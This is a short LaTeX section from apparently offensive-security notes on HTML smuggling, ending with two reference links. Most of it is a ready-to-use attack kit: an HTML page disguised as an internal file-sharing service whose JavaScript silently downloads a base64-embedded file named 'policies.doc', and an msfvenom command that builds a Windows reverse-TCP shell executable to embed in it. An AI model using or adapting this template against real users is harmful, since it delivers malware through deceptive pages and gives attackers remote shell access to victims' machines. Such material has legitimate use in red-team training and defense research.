\section{HTML Smuggling}
It lures victims to open an unsuspected malicious URL (website). Once the victim visits the website, the malicious files will be automatically downloaded to the victim's computer.

The approach relies on crafting a legitimate-looking website that would trick the victims.


To perform an HTML smuggling, we need to create an HTML page that will serve the JavaScript code from HTML Smuggling to download an executable, for example:

\begin{verbatim}
<html>
<title> Internal File Sharing Service </title>
<h1> Your download will start in a few seconds.. </h1>
<body>
  <script>
    function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array( len );
    for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    return bytes.buffer;
   }

    var file ='<< BASE64 ENCODING OF MALICIOUS FILE >>';
    var data = base64ToArrayBuffer(file);
    var blob = new Blob([data], {type: 'octet/stream'});
    var fileName = 'policies.doc';

    if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
    else {
      var a = document.createElement('a');
      document.body.appendChild(a);
      a.style = 'display: none';
      var url = window.URL.createObjectURL(blob);
      a.href = url;
      a.download = fileName;
      a.click();
      window.URL.revokeObjectURL(url);
    }
   </script>
</body>
html>  
\end{verbatim}

then generate a payload base64 encoded and place it in the \verb+var file+

\begin{verbatim}
msfvenom -p windows/shell/reverse_tcp LHOST=<l_ip> LPORT=<l_port> -f exe > shell.exe
base64 -w0 shell.exe 
\end{verbatim}



\subsection{Links}
\begin{itemize}
    \item \href{https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/}{HTML Smuggling explained}
    \item \href{https://www.cyfirma.com/research/html-smuggling-a-stealthier-approach-to-deliver-malware/}{HTML smuggling: A Stealthier Approach to Deliver Malware}
\end{itemize}